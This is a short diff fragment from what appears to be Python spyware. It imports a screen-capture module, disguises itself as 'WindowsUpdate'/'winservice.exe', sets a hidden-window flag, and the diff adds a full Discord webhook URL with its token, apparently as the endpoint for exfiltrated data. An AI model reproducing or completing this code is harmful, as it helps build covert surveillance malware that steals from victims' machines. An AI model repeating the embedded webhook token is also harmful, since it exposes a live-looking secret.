@@ -16,7 +16,7 @@ from PIL import ImageGrab
 
 STARTUP_NAME = "WindowsUpdate"
 FILE_NAME = "winservice.exe"
-WEBHOOK_URL = ''
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1344591630774042668/K-avIBnasMwRypQOsjPpj0AhZs7X-Q-fsEyGOTdFbW79awep3PzDr5VJMmMWfxdFz60l'
 CREATE_NO_WINDOW = 0x08000000
 
 # ------------------- AUTO SECTION -------------------
